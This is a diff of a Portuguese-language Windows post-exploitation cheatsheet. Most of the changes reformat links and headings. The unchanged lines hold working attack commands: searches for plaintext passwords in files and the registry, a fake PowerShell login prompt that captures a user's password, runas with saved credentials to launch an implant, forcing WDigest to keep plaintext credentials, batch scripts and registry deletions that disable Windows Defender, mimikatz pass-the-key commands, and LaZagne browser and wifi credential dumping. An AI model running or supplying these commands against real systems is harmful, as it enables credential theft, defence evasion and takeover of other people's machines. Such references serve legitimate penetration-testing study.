@@ -7,6 +7,8 @@ categories: windows cheatsheet
 tags: windows cheatsheet
 ---
 
+* content
+{:toc}
 
 
 ## Windows Desktop/Workstation Host Post-Exp
@@ -14,25 +16,24 @@ tags: windows cheatsheet
 
 Post-Exp locamente, no contexto de estar sob controle de uma maquina (com shell ou logado com creds). Depois do acesso você precisa fazer recon localmente e seguir com a exploração para escalar privilégio.
 
-- https://attack.mitre.org/techniques/T1087/001/
+- [https://attack.mitre.org/techniques/T1087/001/](https://attack.mitre.org/techniques/T1087/001/)
 
 
 ## Recon Stuff
 > ___
 
-- LPE https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
+- LPE [https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
 
-- cmd commands https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html
+- cmd commands [https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html](https://book.hacktricks.wiki/en/windows-hardening/basic-cmd-for-pentesters.html)
 
-- ps commands https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html
-
-
-
-## Pegando passwords em cleartext 
-> ___
+- ps commands [https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html)
 
 
-#### Procurando senhas em plaintext
+
+### Pegando passwords em cleartext 
+
+
+### Procurando senhas em plaintext
 
 - lista todos os diretorios a partir do c:\
 - ``` C:\> dir /b /a /s c:\ > output.txt ```
@@ -44,10 +45,10 @@ Post-Exp locamente, no contexto de estar sob controle de uma maquina (com shell 
 - No PS
 - ``` get-childitem -path c:\ -recurse -force | select-object -expandproperty fullname > output.txt```
 
-https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples
+[https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir#examples)
 
 
-#### Nomes e Extenções de arquivos interessantes para verificar
+### Nomes e Extenções de arquivos interessantes para verificar
 
 - Extenções: install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .conf, ,ini, .xml, .txt, .gpg, .pgp, .p12, .der, .crs, .cer, id_rsa, id_dsa, .ovpn, vnc,
 ftp, ssh, vpn, git, .kdbx, .db
@@ -58,7 +59,7 @@ ftp, ssh, vpn, git, .kdbx, .db
 
 
 
-#### Arquivos nos Registries 
+### Arquivos nos Registries 
 
 - ``` reg query HKLM /f password /t REG_SZ /s ```
 
@@ -73,7 +74,7 @@ ftp, ssh, vpn, git, .kdbx, .db
 
 
 
-#### Abusing Credential Manager
+### Abusing Credential Manager
 
 - Credential Manager
   - O Credential Manager é uma espécie de cofre digital dentro do sistema Windows. O Windows armazena credenciais de registry, como usernames e senhas...
@@ -97,7 +98,7 @@ ftp, ssh, vpn, git, .kdbx, .db
   - ``` C:\> runas /savedcred /user:administrator "c:\path\to\implant.exe" ```
 
 
-#### Popup local para pegar as creds de um user
+### Popup local para pegar as creds de um user
 
 - Cria um popup que pede a senha do usuário atual
 
@@ -106,7 +107,7 @@ ftp, ssh, vpn, git, .kdbx, .db
 - ``` C:\> powsershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'CHANGE THIS WITH OTHER USERNAME',[Environment]::UserDomainName); $cred.getnetworkcredential().password" ```
 
 
-#### Forçando o WDigest a armazenar credenciais em plaintext
+### Forçando o WDigest a armazenar credenciais em plaintext
 
 Como parte do WDigest authentication provider, as versões do Windows até 8 e 2012 costumavam armazenar credenciais de logon na memória em plaintext por padrão, o que não é mais o caso com versões mais recentes do Windows. 
 
@@ -131,14 +132,14 @@ Depois de ativar a tela de bloqueio e fazer com que o alvo façam login novament
 
 
 REFS: 
-- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext
-- https://github.com/gentilkiwi/mimikatz/wiki
+- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/forcing-wdigest-to-store-credentials-in-plaintext)
+- [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki)
 
 
-#### Disabling Windows Defender(some examples from attack reports)
+### Disabling Windows Defender(some examples from attack reports)
 
-- https://github.com/pgkt04/defender-control
-- https://github.com/ionuttbara/windows-defender-remover
+- [https://github.com/pgkt04/defender-control](https://github.com/pgkt04/defender-control)
+- [https://github.com/ionuttbara/windows-defender-remover](https://github.com/ionuttbara/windows-defender-remover)
 
 - schedule staks + powershell to disable Defender
 
@@ -178,7 +179,7 @@ Defender\MpCmdRun.exe -removedefinitions -dynamicsignatures
 ```
 
 - quick-disable-windows-defender
-- http://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105
+- [http://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105](http://web.archive.org/web/20211121135248/https://gist.github.com/anadr/7465a9fde63d41341136949f14c21105)
 
 ```batch
 rem USE AT OWN RISK AS IS WITHOUT WARRANTY OF ANY KIND !!!!!
@@ -230,7 +231,7 @@ reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHeal
 ```
 
 
-#### Cheatsheet commands
+### Cheatsheet commands
 
 - overpass the hash (a.k.a pass the key)
 
@@ -340,29 +341,29 @@ mimikatz # sekurlsa::credman
 
 
 
-#### Scripts para recon e para extrait passwords da memória, navegadores e etc:
+### Scripts para recon e para extrait passwords da memória, navegadores e etc:
 
 
-- Chrome, FireFox, Opera e mais https://github.com/AlessandroZ/LaZagne
+- Chrome, FireFox, Opera e mais [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne0
   - ```Lazagne.exe browsers -firefox```
   - ```python firefox_decrypt.py C:\Users\USERNAME\AppData\Roaming\Mozilla\FireFox\Profiles\random-val.default```
   - ```Lazagne.exe wifi```
   - ```Lazagne.exe all```
 
-- Mimikittenz (https://github.com/putterpanda/mimikittenz)
+- Mimikittenz ([https://github.com/putterpanda/mimikittenz](https://github.com/putterpanda/mimikittenz))
 
-- Web Creds: https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
+- Web Creds: [https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
 
-- Windows Credentials: https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1
+- Windows Credentials: [https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1](https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)
 
-- Browser Data https://github.com/LimerBoy/Adamantium-Thief
-  - https://github.com/moonD4rk/HackBrowserData
+- Browser Data [https://github.com/LimerBoy/Adamantium-Thief](https://github.com/LimerBoy/Adamantium-Thief)
+  - [https://github.com/moonD4rk/HackBrowserData](https://github.com/moonD4rk/HackBrowserData)
 
-- histórico e cookies do navegador: https://github.com/sekirkity/BrowserGather 
+- histórico e cookies do navegador: [https://github.com/sekirkity/BrowserGather](https://github.com/sekirkity/BrowserGather) 
 
-- A tool SessionGopher (https://github.com/fireeye/SessionGopher) pode pegar hostnames e senhas salvas do WinSCP, PuTTY, SuperPuTTY, FileZilla, e Microsoft Remote Desktop.
+- A tool SessionGopher ([https://github.com/fireeye/SessionGopher](https://github.com/fireeye/SessionGopher)) pode pegar hostnames e senhas salvas do WinSCP, PuTTY, SuperPuTTY, FileZilla, e Microsoft Remote Desktop.
 
-- InternalMonologue tool (Retrieving NTLM Hashes without Touching LSASS) https://github.com/eladshamir/Internal-Monologue
+- InternalMonologue tool (Retrieving NTLM Hashes without Touching LSASS) [https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)
 
 
 
